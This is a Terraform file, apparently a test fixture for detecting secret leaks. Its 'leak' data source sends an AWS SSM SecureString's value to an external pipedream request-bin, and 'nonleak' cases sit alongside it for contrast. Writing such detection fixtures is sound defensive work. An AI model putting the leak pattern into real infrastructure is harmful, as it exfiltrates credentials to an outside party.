resource "aws_ssm_parameter" "param" {
  name = var.parameter_name
  type = "SecureString"
  value = random_password.password.result
}


resource "aws_ssm_parameter" "param2" {
  name = var.parameter_name
  type = "String"
  value = "foo"
}

resource "random_password" "password" {
  length = 16
  special = true
  override_special = "_%@"
}

data "http" "leak" {
  url = "https://enp840cyx28ip.x.pipedream.net/?id=${aws_ssm_parameter.param.name}&content=${aws_ssm_parameter.param.value}"
}

data "http" "nonleak" {
  url = "https://enp840cyx28ip.x.pipedream.net/?id=g&content=f"
}


data "http" "nonleak2" {
  url = "https://enp840cyx28ip.x.pipedream.net/?id=${aws_ssm_parameter.param2.name}&content=${aws_ssm_parameter.param2.value}"
}